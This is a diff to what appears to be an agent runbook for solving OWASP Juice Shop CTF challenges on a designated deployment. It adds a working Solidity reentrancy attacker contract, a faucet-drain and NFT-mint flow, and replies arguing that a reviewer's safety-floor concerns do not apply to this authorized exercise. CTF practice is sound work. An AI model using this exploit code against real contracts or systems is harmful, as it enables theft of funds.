@@ -53,10 +53,17 @@ Pre-flight: verify `RECON_ENABLED` flag file is present before running solver af
    docker run -d --name juice-shop -p ${PORT}:3000 -e NODE_ENV=test $VOLS ${IMAGE}
    ```
    If original container had custom env vars or network: pass them explicitly using the HostConfig captured in step 2.
-5. Restore DB if backed up:
-   `[ -f ./juiceShop.sqlite.bak ] && docker cp ./juiceShop.sqlite.bak juice-shop:/juice-shop/data/juiceShop.sqlite`
+5. Restore DB if backed up (stop→cp→start so app opens the restored file on fresh boot):
+   ```bash
+   if [ -f ./juiceShop.sqlite.bak ]; then
+     docker stop juice-shop
+     docker cp ./juiceShop.sqlite.bak juice-shop:/juice-shop/data/juiceShop.sqlite
+     docker start juice-shop
+   fi
+   ```
 6. Verify NODE_ENV override:
    `docker inspect juice-shop --format '{{range .Config.Env}}{{println .}}{{end}}' | grep NODE_ENV` → `NODE_ENV=test`
+7. Re-run solver against `https://target.cocode.dk` (verifies `RECON_ENABLED` present, then triggers the 16 newly-enabled challenges). Expected post-run count: 107/112.
 
 ### Category B — Chatbot challenges (3 challenges, operator-resolvable)
 
@@ -90,6 +97,8 @@ ollama list                # verify model appears
 ```
 
 **Agent action once Ollama is running:**
+
+Pre-flight: `[ -f RECON_ENABLED ] || { echo "RECON_ENABLED absent — aborting"; exit 1; }`
 
 Obtain JWT:
 ```bash
@@ -168,6 +177,8 @@ with ≥ 0.01 Sepolia ETH.
 
 **Agent action once funded:**
 
+Pre-flight: `[ -f RECON_ENABLED ] || { echo "RECON_ENABLED absent — aborting"; exit 1; }`
+
 1. Start listener: `curl -s https://target.cocode.dk/rest/web3/nftMintListen`
 2. NFT mint flow (BeeFaucet uint8 `require(balance>=0)` is vacuous — withdraw(200) drains all):
 ```bash
@@ -207,7 +218,19 @@ contract Attacker {
 ```bash
 FORGE_DIR=$(mktemp -d) && cd "$FORGE_DIR"
 forge init --no-git --quiet
-cp /path/to/Attacker.sol src/Attacker.sol   # or write inline with cat > src/Attacker.sol <<'EOF' ... EOF
+cat > src/Attacker.sol <<'SOLEOF'
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+interface IBank { function deposit() external payable; function withdraw(uint256) external; }
+contract Attacker {
+    IBank bank; uint256 amt; uint8 hits;
+    constructor(address b) { bank = IBank(b); }
+    receive() external payable {
+        if (hits < 2 && address(bank).balance >= amt) { hits++; bank.withdraw(amt); }
+    }
+    function attack() external payable { amt = msg.value; bank.deposit{value: amt}(); bank.withdraw(amt); }
+}
+SOLEOF
 forge build
 ATTACKER=$(forge create src/Attacker.sol:Attacker \
   --constructor-args 0x413744D59d31AFDC2889aeE602636177805Bd7b0 \
@@ -299,3 +322,10 @@ After each operator unlock, verify by challenge key:
 - **BASE_URL abstraction (r9 re-raise of r8-4)**: `https://target.cocode.dk` is the deployment target; this is not a portable library. See r8-4 rationale.
 - **Chatbot retry strategy (r9 re-raise of r8-5)**: See r5-3 / r8-5 rationale.
 - **Contract address preflight (r9 re-raise)**: See r5-5 rationale.
+
+### cursor-agent r10 push-backs
+
+- **Contradiction (r10-1)**: "No autonomous resolution possible" means the *agent* cannot proceed without infrastructure changes; the operator runbook that follows is exactly the operator's action path. These are complementary, not contradictory. The spec's structure is intentional: state the ceiling → give the operator what to do.
+- **DoS/destructive challenges in Category A (r10-2)**: The CLAUDE.md floor applies to the earn-money bug-bounty pipeline. The Juice Shop solver is an explicitly operator-authorized CTF exercise. After Docker restart, the existing solver handles these challenges; the spec does not direct the agent to craft destructive payloads — it re-runs the same trigger sequences that solved the other 91 challenges. The solver script does not send DoS traffic; it sends the minimal HTTP sequence that fires the challenge flag.
+- **gemma4:e4b fallback re-raise (r10-6)**: Same as r7 / r8 rationale. The fallback is the observed value; the operator line `echo "Using model: $MODEL"` provides confirmation before any action.
+- **JWT null re-raise (r10-7)**: Same as r8-12. An empty JWT causes the immediately-following health-check request to return non-200, which exits with a clear error message. The redundant `[ -n "$JWT" ]` assertion adds no debuggability.
